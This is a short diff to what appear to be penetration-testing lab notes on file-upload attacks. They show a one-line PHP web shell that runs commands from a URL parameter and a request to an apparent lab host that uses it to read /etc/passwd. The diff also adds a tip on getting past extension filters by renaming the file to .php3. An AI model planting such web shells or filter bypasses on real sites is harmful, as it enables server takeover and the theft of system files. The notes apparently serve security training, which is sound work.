@@ -12,6 +12,7 @@ a. Create a file with php function (for e.g. cmd):
   system($_GET["cmd"]);
 ?>
 
-2. Run the url with cmd, for e.g.:
+b. Run the url with cmd, for e.g.:
 http://ptl-f04cf96b-a06904be.libcurl.so/upload/upload.php?cmd=+/etc/passwd
 
+2. If we CANNOT upload a file with .php extension, we can try to rename it to .php3
